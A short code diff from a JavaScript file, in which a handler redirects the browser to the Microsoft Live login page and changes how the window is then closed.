@@ -128,7 +128,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             //Redirect to the provided link
             window.location.href="https://login.live.com";
-            window.close();
+            window.open(location, '_self').close();
         })
     })
 })
